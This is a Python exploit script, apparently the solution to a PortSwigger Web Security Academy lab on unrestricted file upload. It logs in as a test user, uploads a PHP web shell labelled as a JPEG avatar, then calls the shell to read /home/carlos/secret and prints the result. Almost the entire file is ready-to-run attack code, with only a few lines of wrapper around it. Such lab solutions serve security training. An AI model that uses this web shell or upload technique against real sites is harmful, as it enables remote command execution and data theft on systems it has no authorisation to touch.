import requests
import sys
from bs4 import BeautifulSoup


def extract_csrf_token(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token


def get_cookie(url):
    try:
        first_response = requests.get(f"{url}/login")
        first_cookie = first_response.cookies.values()[0]
        csrf_token = extract_csrf_token(first_response)

        login_data = {
            "csrf": csrf_token,
            "username": "wiener",
            "password": "peter"
        }

        second_response = requests.post(f"{url}/login", cookies={"session": first_cookie}, data=login_data, allow_redirects=False)
        second_cookie = second_response.cookies.values()[0]
        return second_cookie


    except requests.exceptions.RequestException as e:
        print(f"An error has occurred: {e}")
        sys.exit(1)

    except IndexError:
        print("Cookie not found in the response, check your url and try again.")
        sys.exit(1)

def upload_file(url, cookie):
    response = requests.get(f"{url}/my-account", cookies={"session": cookie})
    csrf_token = extract_csrf_token(response)

    file = {
        "avatar": ("webshell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg")
    }

    data = {
        "user": "wiener",
        "csrf": csrf_token,
    }

    requests.post(f"{url}/my-account/avatar", cookies={"session": cookie}, files=file, data=data)


def execute_command(url, cookie):
    response = requests.get(f"{url}/files/avatars/webshell.php?cmd=cat%20/home/carlos/secret", cookies={"session": cookie})
    print(response.text)


def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <url>")
        print("Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1].rstrip('/')
    print("Logging in...")
    cookie = get_cookie(url)
    print("Uploading webshell.php...")
    upload_file(url, cookie)
    print(f"File has been uploaded here: {url}/files/avatars/webshell.php")
    print("The contents of the /home/carlos/secret file: ", end='')
    execute_command(url, cookie)


if __name__ == "__main__":
    main()

